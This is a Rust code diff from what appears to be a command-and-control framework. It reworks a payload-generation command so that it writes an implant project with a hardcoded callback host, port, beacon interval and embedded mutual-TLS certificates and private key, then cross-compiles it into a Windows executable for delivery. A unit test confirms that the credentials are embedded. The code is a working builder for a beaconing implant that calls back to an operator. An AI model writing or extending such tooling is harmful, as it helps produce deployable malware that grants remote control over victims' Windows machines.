@@ -1,5 +1,6 @@
 use crate::command::*;
 use crate::message::{CommandOutput, CommandError, CommandResult};
+use crate::pki::ImplantCredentials;
 use clap::{Arg, ArgMatches, Command as ClapCommand};
 use std::any::Any;
 use std::error::Error;
@@ -98,7 +99,8 @@ impl RbCommand for PayloadCommand {
             };
 
             // Generate the payload
-            match self.generate_payload(config) {
+            let creds = context.pki.implant_credentials();
+            match self.generate_payload(config, &creds) {
                 Ok((path, data)) => {
                     let name = path
                         .file_name()
@@ -119,14 +121,51 @@ impl RbCommand for PayloadCommand {
 }
 
 impl PayloadCommand {
-    fn generate_payload(&self, config: PayloadConfig) -> Result<(PathBuf, Vec<u8>), Box<dyn Error>> {
+    fn generate_payload(
+        &self,
+        config: PayloadConfig,
+        creds: &ImplantCredentials,
+    ) -> Result<(PathBuf, Vec<u8>), Box<dyn Error>> {
         use std::fs;
         use std::process::Command;
 
-        // Create the build directory
-        fs::create_dir_all("rb_payload_build/src")?;
+        let base = std::path::Path::new("rb_payload_build");
+        self.write_project(base, &config, creds)?;
 
-        // 1) Write a minimal Cargo.toml that depends on the local rb_implant crate
+        // Build the project targeting Windows GNU
+        println!("Building payload...");
+        let output = Command::new("cargo")
+            .current_dir(base)
+            .args(["build", "--release", "--target", "x86_64-pc-windows-gnu"])
+            .output()?;
+
+        if !output.status.success() {
+            return Err(format!(
+                "Build failed: {}",
+                String::from_utf8_lossy(&output.stderr)
+            )
+            .into());
+        }
+
+        let exe_path = base.join("target/x86_64-pc-windows-gnu/release/rb_payload.exe");
+        if !exe_path.exists() {
+            return Err("Build completed but executable not found at expected path".into());
+        }
+
+        let data = fs::read(&exe_path)?;
+        Ok((exe_path, data))
+    }
+
+    fn write_project(
+        &self,
+        base: &std::path::Path,
+        config: &PayloadConfig,
+        creds: &ImplantCredentials,
+    ) -> Result<(), Box<dyn Error>> {
+        use std::fs;
+
+        fs::create_dir_all(base.join("src"))?;
+
         let manifest = r#"
 [package]
 name = "rb_payload"
@@ -137,19 +176,30 @@ edition = "2021"
 rb_implant = { path = "../rb_implant" }
 tokio = { version = "1", features = ["full"] }
 "#;
-        fs::write("rb_payload_build/Cargo.toml", manifest)?;
+        fs::write(base.join("Cargo.toml"), manifest)?;
 
-        // 2) Write main.rs that configures and invokes the shared implant entry-point
-        let main_rs = format!(r#"
-use rb_implant::{{Args, run_implant_with_args}};
+        // NOTE: the outer raw string uses `r##"..."##` because the generated code
+        // contains inner raw strings written as `r#"..."#`.
+        let main_rs = format!(
+            r##"
+use rb_implant::{{Args, TlsMaterial, run_implant_with_args}};
 
 #[tokio::main]
 async fn main() {{
-    // Use hardcoded configuration
+    let tls_material = TlsMaterial {{
+        ca_cert_pem: r#"{ca}"#.to_string(),
+        client_cert_pem: r#"{cert}"#.to_string(),
+        client_key_pem: r#"{key}"#.to_string(),
+    }};
+
     let args = Args {{
-        host: "{}".to_string(),
-        port: {},
-        interval: {},
+        host: "{host}".to_string(),
+        port: {port},
+        interval: {interval},
+        ca_path: String::new(),
+        cert_path: String::new(),
+        key_path: String::new(),
+        tls_material: Some(tls_material),
     }};
 
     if let Err(e) = run_implant_with_args(args).await {{
@@ -157,36 +207,53 @@ async fn main() {{
         std::process::exit(1);
     }}
 }}
-"#, config.host, config.port, config.interval);
-
-        fs::write("rb_payload_build/src/main.rs", main_rs)?;
-
-        // 3) Build the project targeting Windows GNU
-        println!("Building payload...");
-        let output = Command::new("cargo")
-            .current_dir("rb_payload_build")
-            .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
-            .output()?;
-        
-        if !output.status.success() {
-            return Err(format!(
-                "Build failed: {}",
-                String::from_utf8_lossy(&output.stderr)
-            ).into());
-        }
-
-        // 4) Return the path to the .exe
-        let exe_path = PathBuf::from(
-            "rb_payload_build/target/x86_64-pc-windows-gnu/release/rb_payload.exe",
+"##,
+            ca = creds.ca_cert_pem,
+            cert = creds.client_cert_pem,
+            key = creds.client_key_pem,
+            host = config.host,
+            port = config.port,
+            interval = config.interval,
         );
-        
-        if !exe_path.exists() {
-            return Err("Build completed but executable not found at expected path".into());
+        fs::write(base.join("src/main.rs"), main_rs)?;
+
+        Ok(())
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn creds() -> ImplantCredentials {
+        ImplantCredentials {
+            ca_cert_pem: "-----BEGIN CERTIFICATE-----\nCA\n-----END CERTIFICATE-----\n".to_string(),
+            client_cert_pem: "-----BEGIN CERTIFICATE-----\nCERT\n-----END CERTIFICATE-----\n"
+                .to_string(),
+            client_key_pem: "-----BEGIN PRIVATE KEY-----\nKEY\n-----END PRIVATE KEY-----\n"
+                .to_string(),
         }
+    }
 
-        // 5) Read the executable so it can be sent to the client
-        let data = fs::read(&exe_path)?;
+    #[test]
+    fn generated_main_embeds_credentials() {
+        let dir = std::env::temp_dir().join(format!("rb_payload_{}", uuid::Uuid::new_v4()));
+        let config = PayloadConfig {
+            host: "10.0.0.5".to_string(),
+            port: 8443,
+            interval: 7,
+        };
 
-        Ok((exe_path, data))
+        PayloadCommand
+            .write_project(&dir, &config, &creds())
+            .unwrap();
+
+        let main_rs = std::fs::read_to_string(dir.join("src/main.rs")).unwrap();
+        assert!(main_rs.contains("10.0.0.5"));
+        assert!(main_rs.contains("port: 8443"));
+        assert!(main_rs.contains("-----BEGIN CERTIFICATE-----"));
+        assert!(main_rs.contains("-----BEGIN PRIVATE KEY-----"));
+
+        let _ = std::fs::remove_dir_all(&dir);
     }
 }
